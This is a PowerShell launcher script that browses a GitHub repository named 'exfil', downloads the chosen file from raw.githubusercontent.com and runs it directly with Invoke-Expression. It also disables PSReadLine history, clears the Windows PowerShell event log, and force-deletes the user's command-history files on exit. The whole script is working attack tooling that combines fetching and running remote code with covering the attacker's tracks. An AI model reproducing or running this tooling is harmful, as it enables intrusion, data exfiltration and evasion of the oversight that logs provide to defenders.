# === Setup ===
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {
    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol
}

Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent

# === GitHub Repo Info ===
$repoOwner = "sempiampi"
$repoName  = "exfil"
$branch    = "main"
$uri       = "https://api.github.com/repos/$repoOwner/$repoName/contents"

# === Get top-level contents ===
$response = Invoke-RestMethod -Uri $uri -Headers @{ "User-Agent" = "PowerShell" }
$folders = $response | Where-Object { $_.type -eq "dir" }

while ($true) {
    # List all folders
    $folderIndex = 1
    Write-Host "Available Folders in the Repository:" -ForegroundColor Yellow -BackgroundColor Black
    foreach ($folder in $folders) {
        Write-Host "$folderIndex. $($folder.name)"
        $folderIndex++
    }

    $selectedFolderIndex = $(Write-Host "Enter the folder number to view its contents, or type 'q' to quit: " -ForegroundColor Yellow -BackgroundColor Black -NoNewline; Read-Host)
    
    if ($selectedFolderIndex -eq 'q') {
        Write-Host "Exiting..." -ForegroundColor Red

        # Clear PSReadLine history
        $username = ((Get-CIMInstance -Class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
        $psfolderpath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
        if (Test-Path -Path $psfolderpath -PathType Container) {
            $files = Get-ChildItem -Path $psfolderpath
            if ($files.Count -gt 0) {
                Remove-Item -Path "$psfolderpath\*" -Force -Confirm:$false -Recurse -ErrorAction SilentlyContinue
            }
        }
        break
    }

    $selectedFolderIndex = [int]$selectedFolderIndex
    if ($selectedFolderIndex -ge 1 -and $selectedFolderIndex -le $folders.Count) {
        $selectedFolder = $folders[$selectedFolderIndex - 1].name
        while ($true) {
            # Fetch and list files in folder
            $folderUri = "https://api.github.com/repos/$repoOwner/$repoName/contents/$selectedFolder"
            $folderResponse = Invoke-RestMethod -Uri $folderUri -Headers @{ "User-Agent" = "PowerShell" }
            $files = $folderResponse | Where-Object { $_.type -eq "file" }
            
            $fileIndex = 1
            Write-Host "Contents of Folder '$selectedFolder':" -ForegroundColor Yellow -BackgroundColor Black
            foreach ($file in $files) {
                Write-Host "$fileIndex. $($file.name)"
                $fileIndex++
            }

            $selectedFileIndex = $(Write-Host "Enter the file number to execute it, 'b' to go back, or 'q' to quit: " -ForegroundColor Yellow -BackgroundColor Black -NoNewline; Read-Host)
            
            if ($selectedFileIndex -eq 'q') {
                Write-Host "Exiting..." -ForegroundColor Red
                # Clear PSReadLine history
                $username = ((Get-CIMInstance -Class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
                $psfolderpath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
                if (Test-Path -Path $psfolderpath -PathType Container) {
                    $files = Get-ChildItem -Path $psfolderpath
                    if ($files.Count -gt 0) {
                        Remove-Item -Path "$psfolderpath\*" -Force -Confirm:$false -Recurse -ErrorAction SilentlyContinue
                    }
                }
                break 2
            }

            if ($selectedFileIndex -eq 'b') { break }

            $selectedFileIndex = [int]$selectedFileIndex
            if ($selectedFileIndex -ge 1 -and $selectedFileIndex -le $files.Count) {
                $selectedFile = $files[$selectedFileIndex - 1].path
                $selectedFileUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch/$selectedFile"
                Write-Host "You chose: $selectedFile" -ForegroundColor Green -BackgroundColor Black
                $urlContent = (Invoke-WebRequest -Uri $selectedFileUrl -UseBasicParsing -Headers @{ "User-Agent" = "PowerShell" }).Content
                Invoke-Expression $urlContent
            } else {
                Write-Host "Invalid selection. Please choose a valid number, 'b' to go back, or 'q' to quit: " -ForegroundColor Red -BackgroundColor Black
            }
        }
    } else {
        Write-Host "Invalid selection. Please choose a valid number, 'q' to quit: " -ForegroundColor Red -BackgroundColor Black
    }
}